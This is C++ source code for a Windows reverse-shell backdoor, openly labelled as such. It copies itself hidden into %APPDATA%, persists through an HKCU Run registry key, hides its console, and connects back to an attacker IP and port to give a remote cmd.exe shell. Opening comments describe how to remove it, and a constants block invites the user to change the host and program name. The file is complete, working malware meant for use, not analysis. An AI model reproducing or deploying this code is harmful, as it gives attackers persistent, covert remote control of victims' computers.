#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")


// to remove WIN + R
// type: regedit

// find the program using this path
// HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

// Look for an entry named:
// MyCustomApp

// Right-click it and choose Delete.


// Delete the Hidden Executable
// Press Win + R, type %APPDATA%, and hit Enter.

// Look for an entry named:
// MyCustomApp.exe


// ===== CONFIGURATION - CHANGE THESE VALUES =====
const wchar_t* PROGRAM_NAME = L"MyCustomApp";  // Change this to your desired name
// ===== END CONFIGURATION =====

// ===== REVERSE TCP CONFIGURATION =====
const char* HOST = "192.168.10.112";  // Attacker's IP
const int PORT = 4444;               // Attacker's port
// ===== END CONFIGURATION =====

// ===== CONFIGURATION - STARTUP and WHAIT =====
const int STARTUP_DELAY = 60000;
const int HIDDEN_DELAY = 60000;
const int NOT_HIDDEN_DELAY = 60000;
const int LAUNCH_HIDDEN_COPY = 60000;
const int RETRY_CONNECTING_TO_C2 = 60000;
// ===== END CONFIGURATION =====

// Generate the full executable name
std::wstring GetExeName() {
    return std::wstring(PROGRAM_NAME) + L".exe";
}

// Generate the autorun registry value name
std::wstring GetAutorunValueName() {
    return std::wstring(PROGRAM_NAME);
}

bool IsHiddenInstance() {
    WCHAR curPath[MAX_PATH];
    GetModuleFileNameW(NULL, curPath, MAX_PATH);
    
    // Check if running from appdata directory
    WCHAR targetDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetDir))) {
        std::wstring targetExe = std::wstring(targetDir) + L"\\" + GetExeName();
        return wcscmp(curPath, targetExe.c_str()) == 0;
    }
    return false;
}

void SetAutorun() {
    HKEY hKey;
    const wchar_t* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        WCHAR fullPath[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, fullPath);
        std::wstring targetExe = std::wstring(fullPath) + L"\\" + GetExeName();
        
        RegSetValueExW(hKey, GetAutorunValueName().c_str(), 0, REG_SZ, 
                      (BYTE*)targetExe.c_str(), (targetExe.length() + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
    }
}

void InstallAndHide() {
    WCHAR sourcePath[MAX_PATH];
    GetModuleFileNameW(NULL, sourcePath, MAX_PATH);
    
    WCHAR destDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, destDir))) {
        std::wstring targetExe = std::wstring(destDir) + L"\\" + GetExeName();
        
        // Copy to hidden location
        CopyFileW(sourcePath, targetExe.c_str(), FALSE);
        
        // Set hidden attribute
        SetFileAttributesW(targetExe.c_str(), FILE_ATTRIBUTE_HIDDEN);
        
        // Set autorun registry entry
        SetAutorun();
    }
}

void StartRootKit() {
    WSADATA wsaData;
    SOCKET sock;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    struct sockaddr_in addr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Set up target address
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &addr.sin_addr);

    // Connect to attacker (with retry logic)
    while (connect(sock, (SOCKADDR*)&addr, sizeof(addr))) {
        Sleep(RETRY_CONNECTING_TO_C2);  // Retry every 5 seconds
    }

    // Hide window and redirect I/O
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    // Create hidden cmd.exe process
    TCHAR cmd[] = TEXT("cmd.exe");
    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
}

void LaunchHiddenCopy() {
    WCHAR destDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, destDir))) {
        std::wstring targetExe = std::wstring(destDir) + L"\\" + GetExeName();
        
        // Launch hidden copy
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessW(targetExe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        
        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    Sleep(STARTUP_DELAY);
    
    if (IsHiddenInstance()) {
        // Stealth mode - begin rootkit functionality
        Sleep(HIDDEN_DELAY);
        StartRootKit();
    } else {
        // First run - install and hide
        Sleep(NOT_HIDDEN_DELAY);
        InstallAndHide();
        Sleep(LAUNCH_HIDDEN_COPY);
        LaunchHiddenCopy();
    }

    return 0;
}
